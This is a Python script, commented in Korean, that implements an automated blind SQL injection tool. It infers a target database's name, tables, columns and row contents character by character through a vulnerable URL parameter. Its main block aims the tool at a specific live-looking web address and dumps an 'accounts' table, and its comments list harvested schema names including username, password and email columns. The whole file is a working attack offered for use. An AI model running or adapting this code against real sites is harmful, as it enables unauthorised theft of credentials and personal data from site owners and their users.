from functools import wraps
import requests


class Bliend_sqli():
    """
    Bliend SQL Injction을 위한 Class 
    Bliend_sqli(url:str, query:str, signature:str, sql_starter:str = "' and ", sql_ender:str = "#", cookie:dict[str:str] = {}, req:str = "G")
    Args:
        url(str): SQL Injection 취약점이 있는 URL
        sql_starter(str): SQLi 여는 문자열. 초기값은 "' and "
        sql_ender(str): SQLi 닫는 문자열. 초기값은 "#"
        signature(str): SQL문 True 시그니처
        query(str): SQL취약점의 URL쿼리 매개변수 명
        cookie(dict[str:str]): 요청 쿠키. 기본값 {}
        req(str): 요청 방식 GET or Post. (G)/P
    Attributes:
        url(str): SQL Injection 취약점이 있는 URL
        sql_starter(str): SQLi 여는 문자열
        sql_ender(str): SQLi 닫는 문자열
        signature(str): SQL문 True 시그니처
        query(str): SQL취약점의 URL쿼리 매개변수 명
        cookie(dict[str:str]): 요청 쿠키. 기본값 {}
        req(str): 요청 방식 GET or Post. (G)/P
        db_name(str): 사용중인 DB명
        table_name(list[str]): 사용중인 DB의 Table 명
        column_name(dict[str:list]): 사용중인 DB의 컬럼명
    """
    def __init__(self, url:str, query:str, signature:str, sql_starter:str = "' and ", sql_ender:str = "#", cookie:dict[str:str] = {}, req:str = "G", para:list = []): 
        """
        Bliend_sqli class의 __init__ method
        Args:
            url(str): SQL Injection 취약점이 있는 URL
            sql_starter(str): SQLi 여는 문자열. 초기값은 "' and "
            sql_ender(str): SQLi 닫는 문자열. 초기값은 "#"
            signature(str): SQL문 True 시그니처
            query(str): SQL취약점의 URL쿼리 매개변수 명
            cookie(dict[str:str]): 요청 쿠키. 기본값 {}
            req(str): 요청 방식 GET or Post. (G)/P
            para(list): [str] 형식으로 파라미터 이름과 값을 =을 통해서 입력. (EX: ["id=kaya", "pw=password"])
        """
        # 매개변수를 번수 선언 및 정의
        self.url = url
        self.sql_starter = sql_starter
        self.sql_ender = sql_ender
        self.signature = signature
        self.cookie = cookie
        self.query = query
        self.req = req
        self.para = para

    def _sqli_req(self, sql_query: str) -> object:
        """
        SQL 쿼리 concat 및 get request전송 내부 함수 
        Args:
            sql_query(str): sql 쿼리문
        Returns:
            response(object): response object 반환            
        """
        sql = self.sql_starter + sql_query + self.sql_ender
                        
        url_query = {self.query:sql}

        
        for i in self.para:
            tmp = i.split("=")
            url_query[tmp[0]] = tmp[1]

        # request 전송

        if self.req == "G":
            response = requests.get(self.url, params = url_query, cookies = self.cookie)
            return response
        
        elif self.req == "P":
            response = requests.post(self.url, params = url_query, cookies = self.cookie)
            return response
        else:
            raise


    def _bin_search(func: object) -> object:
        """
        binary search 알고리즘을 이용한 sql 문자 탐색 내부 데코레이터
        데이터 문자 반환 
        Params:
            data(str): 데이터에 해당하는 SQL 쿼리문
            i(int): 문자열에서 i번째 문자를 위한 요소
            sign(str): 비교연산자
            mid(int): binary search 알고리즘에서 사용되는 중간값
        Returns:
            bin_deco(object): 데이터의 문자 탐색 반환 메서드 
        """
        @wraps(func)
        def bin_deco(self, data: str, i: int) -> int:
            """
            해당 데이터의 해당 위치에 대하여 문자를 탐색 반환 메서드
            Args:
                data(str): 데이터에 해당하는 SQL 쿼리문
                i(int): 문자열에서 i번째 문자를 위한 요소
            Returns:
                db_data(str): i번째 문자 값 
            """
            left = 33
            right = 126
             
            while left < right:
                mid = (left + right) // 2
                
                sql_query = func(data, i, ">", mid)

                # SQL query GET 요청 전송
                response = self._sqli_req(sql_query)

                if self.signature in response.text:
                    left = mid + 1
                else:
                    right = mid 
            # mid가 올바른 값인지 확인     
            # SQL 쿼리문
            sql_query = func(data, i, "=", mid)
            
            # SQL query GET 요청 전송
            response = self._sqli_req(sql_query)
            
            if self.signature in response.text:
                db_data = chr(mid)
            else:
                db_data =  chr(mid + 1)

            return db_data
        return bin_deco
    
    def _len_search(func: object) -> object:
        """
        데이터 길이 탐색 반환 데코레이터
        Args:
            data(str): 길이 탐색 대상 data를 구하는 쿼리문
            cnt(int): 비교연산에 사용할 값
        Returns:
            len_deco(object): 데이터의 길이를 탐색 반환하는 메서드
        """
        @wraps(func)
        def len_deco(self, data:str) -> int:
            """
            해당 데이터의 길이를 탐색 반환하는 메서드
            Args:
                data(str): 길이 탐색 대상 data를 구하는 쿼리문
            Returns:
                data_len(int): 데이터 길이
            """
            run = True
            cnt = 0 

            # Null값 확인
            # SQL 쿼리문
            sql_query = func(data, "NULL", "is")
        
            # SQL query GET 요청 전송
            response = self._sqli_req(sql_query)

            # response 값 확인
            if self.signature in response.text:
                data_len = 0
                return data_len
            

            #data 길이 추출      
            while run:
                cnt += 1
                # SQL 쿼리문
                sql_query = func(data, cnt)

                # SQL query GET 요청 전송
                response = self._sqli_req(sql_query)

                # response 값 확인
                if self.signature in response.text:
                    data_len = cnt + 1 # 더블쿼터가 앞에 추가되기에 마지막 글자 포함을 위해 +1
                    run = False
            return data_len
        return len_deco
    
    def _cnt_search(func: object) -> object:
        """
        데이터 갯수 탐색 반환 데코레이터
        Args:
            data(str): 갯수 탐색 대상 data를 구하는 쿼리문
            cnt(int): 비교연산에 사용할 값
        Returns:
            cnt_deco(object): 데이터의 갯수를 탐색 반환하는 메서드
        """
        @wraps(func)
        def cnt_deco(self, data:str) -> int:
            """
            해당 데이터의 갯수를 탐색 반환하는 메서드
            100개 단위로 탐색 후 1개씩 탐색
            Args:
                data(str): 갯수 탐색 대상 data쿼리문
            Returns:
                data_cnt(int): 데이터 갯수
            """
            run = True
            cnt = 0 

            #data 갯수 추출      
            while run:
                
                # SQL 쿼리문
                sql_query = func(data,">", cnt * 100)

                
                # SQL query GET 요청 전송
                response = self._sqli_req(sql_query)

                # response 값 확인
                if self.signature not in response.text:
                    data_max = cnt * 100
                    data_min = (cnt - 1) * 100
                    run = False
                cnt += 1

            run = True
            cnt = data_min

            while run:
                cnt += 1
                # SQL 쿼리문
                sql_query = func(data,"=", cnt)
                
                # SQL query GET 요청 전송
                response = self._sqli_req(sql_query)

                # response 값 확인
                if self.signature in response.text:
                    data_cnt = cnt
                    run = False
                # elif cnt > data_max:
                #     raise Exception("Table Count Error")  
            return data_cnt
        return cnt_deco
    
    
    @_bin_search
    def _char_search(data:str, i:int, sign:str, mid:int) -> str:
        """
        Sql 쿼리문 반환 함수.
        Args:
            data(str): 데이터에 해당하는 SQL 쿼리문
            i(int): 문자열에서 i번째 문자를 위한 요소
            sign(str): 비교연산자
            mid(int): binary search 알고리즘에서 사용되는 중간값
        Returns:
            sql_query(str): 데이터의 i번째 문자를 탐색하는 쿼리문            
        """
        sql_query = "(ascii(substring((%s), %s, 1)) %s %s)"%(data, i, sign, mid)
        return sql_query
    
    @_len_search
    def _len_find_db(data: str, i: int, sign:str = "=") -> str:
        """
        데이터의 길이 탐색 쿼리문 반환 메서드
        Args:
            data(str): 길이를 찾을 데이터 쿼리문
            i(int): 비교연산에 사용될 값
            sign(str): 연산기호. 기본값 "="
        Returns:
            sql_query(str): 데이터 길이 탐색 쿼리문
        """
        
        sql_query = "(length(%s) %s %s)"%(data, sign, i)
        return sql_query
    
    @_cnt_search
    def _cnt_find(data: str, sign: str, i: int) -> str:
        """
        데이터의 길이 탐색 쿼리문 반환 메서드
        Args:
            data(str): 갯수를 찾을 데이터 쿼리문
            sign(str): 비교연산자
            i(int): 비교연산에 사용될 값            
        Returns:
            sql_query(str): 데이터 길이 탐색 쿼리문
        """
        sp_data = data.split("from")
        sp_data[0] = sp_data[0].replace("select", "")
        sql_query = "((select count(%s) from %s) %s %s)"%(sp_data[0],sp_data[1], sign, i)
        
        return sql_query
    
    @_len_search
    def _len_find(data: str, i: int, sign:str = "=") -> str:
        """
        데이터의 길이 탐색 쿼리문 반환 메서드
        Args:
            data(str): 길이를 찾을 데이터 쿼리문
            sign(str): 비교연산자
            i(int): 비교연산에 사용될 값      
            sign(str): 연산 기호. 초기값 "="      
        Returns:
            sql_query(str): 데이터 길이 탐색 쿼리문
        """
        sp_data = data.split("from")
        sp_data[0] = sp_data[0].replace("select", "")

        sql_query = "((select length(%s) from %s) %s %s)"%(sp_data[0],sp_data[1], sign, i)
        return sql_query



    def db_name_func(self) -> str:
        """
        Bliend SQLi를 이용해서 현재 사용중인 DB명을 추출하는 메서드
        Returns:
            str: BD명 반환
        """

        db_name = "" 

        #db 길이 추출      
        print("DB 길이 추출 시작")
        # SQL 쿼리문
        sql_data = "database()"
        db_len = self._len_find_db(sql_data) - 1

        print("DB 길이 추출 완료.. \nDB 길이 : %s" %db_len)



        for i in range(1, db_len + 1):
            data_query = "select database()"
            db_char = self._char_search(data_query, i)
            db_name += db_char
                        
        print("DB 명 탐색이 끝났습니다. \nDB NAME : %s"%db_name)
        self.db_name = db_name
        return db_name
    
    def table_name_function(self, db:str = None) -> list[str]:
        """
        Bliend SQLi를 이용해서 현제 사용중인 DB의 Table명을 추출하는 메서드 
        Args:
            db(str): DB명. 초기값은 현제 사용중인 DB
        Returns:
            list[str]: Table명 리스트
        """
        if db == None:
            db = self.db_name_func()

        # tabel 갯수 추출
        print("table 갯수 추출 시작")
        sql_data = "select table_name from information_schema.tables where table_schema = '%s'"%db
        
        table_cnt = self._cnt_find(sql_data)
        print("table 갯수 : %s"%table_cnt)

        # table 길이 추출
        table_len = []
        for i in range (0, table_cnt):
            sql_data_len = sql_data + "limit %s,1"%i
            t_len = self._len_find(sql_data_len)  
            table_len.append(t_len)
            
        print("table 길이 : ")
        print(table_len)

        # table 명 추출
        print("table명 추출 시작")
        table_name = []
        for j in range(0, table_cnt):
            table_name.append("")
            for k in range(1, table_len[j]): # 맨 앞 더블쿼터 제거
                sql_data_len = "%s limit %s,1"%(sql_data, j)                
                t_name = self._char_search(sql_data_len, k)
                table_name[j] += t_name
        print("Table명 탐색이 끝났습니다. \nTable Name : ")
        print(table_name)

        self.table_name = table_name
        return table_name

    def column_name_func(self, table:list[str], db:str = None) -> dict[str:list]:
        """
        사용중인 DB의 Column명을 추출 및 반환 하는 함수
        Args:
            tabel(list[str]): table 명 리스트
            db(str): db명 리스트. 초기값은 현제 사용중인 DB명
        Returns:
            column_name(dict[str:list]): 컬럼명 반환. table명:컬럼명 리스트 형식
        """
        
        # select column_name from information_schema.columns where table_name='flag_table' limit 0,1
        if db == None:
            db = self.db_name_func()
        column_cnt = {}
        column_len = {}
        column_name = {}
        for i in range(len(table)):
            #컬럼 갯수 추출
            sql_data = "select column_name from information_schema.columns where table_name = '%s'"%table[i]            
            column_cnt_li = self._cnt_find(sql_data)
            column_cnt[table[i]] = column_cnt_li
            
            # column 길이 추출
            column_len[table[i]] = []
            for j in range (0, column_cnt[table[i]]):
                sql_data_len = "%s limit %s,1"%(sql_data, j)
                c_len = self._len_find(sql_data_len)                
                column_len[table[i]].append(c_len)
        
        
            # table 명 추출
            column_name[table[i]] = []
            for k in range(0, column_cnt[table[i]]):
                column_name[table[i]].append("")
                for l in range(1, column_len[table[i]][k]): # 맨 앞 더블쿼터 제거
                    sql_data_len = "%s limit %s,1"%(sql_data, k)                
                    t_name = self._char_search(sql_data_len, l)
                    column_name[table[i]][k] += t_name
            print("%s Column Data : "%table[i])
            print(column_name[table[i]])
        print(column_name)

        self.column_name = column_name
        return column_name
        
    def db_data_func(self, table:list[str], column:dict[str:list[str]] = None, db:str = None, lim:int = None) -> dict[str:list[str]]:
        """
        사용중인 DB의 Data를 추출 및 반환 하는 함수
        Args:
            table(list[str]): 테이블명 리스트
            column(dict[str:list[str]]]): 컬럼명 리스트. 초기값은 Table의 전체 컬럼명. {table:[column]}구조
            db(str): DB명. 기본값은 사용중인 DB명
            lim(int): 가져올 데이터 갯수. 초기값은 모든 데이터 갯수.
        Returns:
            db_data(dict[str:list[str]]): DB 데이터 반환. db_data[column[data]] 구조            
        """
        if db == None:
            db = self.db_name_func()

        if column == None:
             column = self.column_name_func(table, db = db)

        def get_data(dlen, sql_data_len:int) -> str:            
            data = ""
            for l in range(1, dlen): 
                d_data = self._char_search(sql_data_len, l)
                data += d_data
            return data

        data_cnt = []
        data_len = {}
        db_data = {}

        for i in range(len(table)):
            table_name = table[i]
            sql_data = "select * from %s.%s"%(db, table_name) 
            data_cnt.append(self._cnt_find(sql_data))
            
        if lim == None:
            lim_li = data_cnt
        else:
            lim_li = []
            for i in range(len(table)):
                lim_li[i] = lim

        for i in range(len(table)):
            table_name = table[i]
            data_len[table_name] = []
            db_data[table_name] = []
            for j in range(lim_li[i]):
                data_len[table_name].append([])
                db_data[table_name].append([])

                for k in range(len(column[table_name])):
                    column_name = column[table_name][k]

                    sql_data = "select %s from %s.%s"%(column_name, db, table_name) 
                    sql_data_len = "%s limit %s,1"%(sql_data, j)

                    # data 길이 구하기
                    d_len = self._len_find(sql_data_len)
                    data_len[table_name][j].append(d_len)

                    #데이터 구하기
                    
                    db_data[table_name][j].append("")                                      
                    dlen = data_len[table_name][j][k]
                    db_data[table_name][j][k] = get_data(dlen, sql_data_len)

                    # for l in range(1, data_len[table_name][j][k]):
                    #     d_data = self._char_search(sql_data_len, l)
                    #     db_data[table_name][j][k] += d_data
                print (db_data) 
        print (db_data) 
        return db_data



if __name__ == "__main__":

    url = "http://nk.iqsp.com/nk/conent.php"
    sql_starter = "131' and "
    sql_ender = " and '1' = '1"
    signature = "Hacked!!!"

    sqli = Bliend_sqli(url, "id", signature = signature, sql_starter = sql_starter, sql_ender = sql_ender)
    # a = sqli.db_name_func()
    b = sqli.table_name_function()
    # c = sqli.column_name_func()
    # with open("run.txt", "w") as runf:
    #     runf.write("%s\n\n%s\n\n%s\n\n"%(a,b,c))

    # sqli.db_name = "phplogin"

    # sqli.table_name = ['accounts', 'board1_file', 'board3_file', 'board_1', 'board_3']

    # sqli.column_name = {'accounts': ['id', 'username', 'password', 'email', 'address_num'], 'adress_kr': ['ZIP_NO', 'SIDO', 'SIDO_ENG', 'SIGUNGU', 'SIGUNGU_ENG', 'EUPMYUN', 'EUPMYUN_ENG', 'DORO_CD', 'DORO', 'DORO_ENG', 'UNDERGROUND_YN', 'BUILD_NO1', 'BUILD_NO2', 'BUILD_NO_MANAGE_NO', 'DARYANG_NM', 'BUILD_NM', 'DONG_CD', 'DONG_NM', 'RI', 'H_DONG_NM', 'SAN_YN', 'ZIBUN1', 'EUPMYUN_DONG_SN', 'ZIBUN2', 'ZIP_NO_OLD', 'ZIP_SN'], 'board1_file': ['id', 'filename', 'filesize', 'uploader', 'uploadDate', 'boardNO', 'contentNO'], 'board3_file': ['id', 'filename', 'filesize', 'uploader', 'uploadDate', 'boardNO', 'contentNO'], 'board_1': ['board_id', 'writer', 'title', 'content', 'regdate', 'updatedate'], 'board_3': ['board_id', 'writer', 'title', 'content', 'regdate', 'updatedate'], 'ggd': ['~~~~""""""""', '~~~~""""""""', '~~~~~""""""""""', '~~~""""""', '~~~~""""""""', '~~~~~~""""""""""""', '~~~~""""""""', '~~~""""""', '~~~~_~~""""""""""""', '~~~~_~""""""""""', '~~~~""""""""', 'id'], 'ggd_adress': ['~~~~""""""""', '~~~~""""""""', '~~~~~""""""""""', '~~~""""""', '~~~~""""""""', '~~~~~~""""""""""""', '~~~~""""""""', '~~~""""""', '~~~~_~~""""""""""""', '~~~~_~""""""""""', '~~~~""""""""', 'id'], 'ggd_sub': ['~~~~""""""""', '~~~~~""""""""""', '~~~~""""""""', '~~~~""""""""', '~~~~_~~~~""""""""""""""""', '~~~~~~""""""""""""', '~~~~~_~~~""""""""""""""""', '~~~_~~~""""""""""""', '~~~~~~""""""""""""', 'id']}

    sqli.db_data_func(table = ["accounts"])
    # sqli.column_name_func(["accounts"])
    # sqli.table_name_function("phplogin")
